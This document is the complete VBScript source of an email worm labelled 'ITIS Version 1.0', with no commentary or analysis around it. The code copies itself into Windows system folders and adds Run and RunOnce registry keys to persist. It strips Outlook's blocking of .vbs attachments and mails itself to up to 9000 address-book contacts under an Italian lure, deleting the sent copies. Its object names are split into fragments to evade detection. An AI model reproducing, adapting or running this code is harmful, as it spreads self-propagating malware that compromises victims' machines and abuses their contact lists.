   'ITIS Version 1.0 Coded by Sarosoft
   'Special Edition Dedicated to CuTTioLa (Rosy)
   On Error Resume Next
   bKLxzlTrWqk = (WScript.ScriptFullName)
   Set DcXmkdXewreh = CreateObject("WScript.Shell")
   Set bRsJhdblaYr = CreateObject("Scripting.FileSystemObject")
   bRsJhdblaYr.copyfile bKLxzlTrWqk, "C:\WINDOWS\system32" & "\Importante.vbs"
   bRsJhdblaYr.copyfile bKLxzlTrWqk, "C:\WINDOWS\system" & "\WinService.vbs"
   DcXmkdXewreh.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Runonce\WinRun", "C:\WINDOWS\system32\Importante.vbs"
   DcXmkdXewreh.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\Service", "C:\WINDOWS\system\WinService.vbs"
   Call kFDcYreEWjkBv
   Call eRtYcVlKdFeqP
   Sub kFDcYreEWjkBv()
   DcXmkdXewreh.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\Command", "C:\WINDOWS\system32\COMMAND.BAT"
   bRsJhdblaYr.copyfile bKLxzlTrWqk, "C:\WINDOWS\system32" & "\SysConfig.ini"
   set lFwHfJyxRi = bRsJhdblaYr.CreateTextFile("C:\WINDOWS\system32\COMMAND.BAT")
   lFwHfJyxRi.WriteLine "@copy SysConfig.ini C:\WINDOWS\Temp"
   lFwHfJyxRi.WriteLine "@ren C:\WINDOWS\Temp\SysConfig.ini C:\WINDOWS\Temp\Task32.vbs"
   lFwHfJyxRi.WriteLine "@start C:\WINDOWS\Temp\Task32.vbs"
   lFwHfJyxRi.close
   End Sub
   Sub eRtYcVlKdFeqP()
   DcXmkdXewreh.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Outlook\Security\Level1Remove", "vbs"
   DcXmkdXewreh.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Outlook\Security\Level1Remove", "vbs"
   DcXmkdXewreh.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Outlook\Security\Level1Remove", "vbs"
   Dim a, b, c, d, e, f, g, h, i, hGzmmNNbYwpl, uRrrLkgTdXcPf
   a = "Scri"
   b = "pting"
   c = ".fileS"
   d = "ystemO"
   e = "bject"
   f = "Wscr"
   g = "ipt."
   h = "She"
   i = "ll"
   Set hGzmmNNbYwpl = CreateObject(a + b + c + d + e)
   Set uRrrLkgTdXcPf = CreateObject(f + g + h + i)
   Dim j, k, l, m, n, o, p, q, r, s, t, u, v, w, x, y, z
   j = "Out"
   k = "look."
   l = "Appl"
   m = "icat"
   n = "ion"
   o = "M"
   p = "AP"
   q = "I"
   Set r = CreateObject(j + k + l + m + n)
   Set s = r.getnamespace(o + p + q)
   Set w = r.CreateItem(0)
   For t = 1 To s.AddressLists.Count
   Set u = s.AddressLists.Item(t)
   v = 1
   Set z = u.AddressEntries
   For x = 1 To z.Count
   v = v + 1
   If v > 9000 Then Exit For
   w.Recipients.Add z.Item(x)
   Next
   w.Subject = "Importante"
   w.Body = "Ciao, ecco il file che mi avevi chiesto."
   w.Attachments.Add "C:\WINDOWS\system32\Importante.vbs"
   w.DeleteAfterSubmit = True
   w.Send
   Next
   'encrypted with kvee! by kefi
